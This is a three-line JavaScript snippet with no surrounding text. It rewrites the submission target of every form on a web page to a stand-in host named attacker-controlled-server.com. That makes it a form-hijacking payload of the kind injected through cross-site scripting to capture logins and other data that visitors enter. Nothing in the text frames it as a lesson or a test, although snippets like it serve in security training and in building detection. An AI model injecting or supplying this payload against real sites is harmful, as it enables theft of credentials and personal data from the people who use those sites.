document.querySelectorAll('form').forEach((form) => {
    form.setAttribute('action', 'https://attacker-controlled-server.com');
});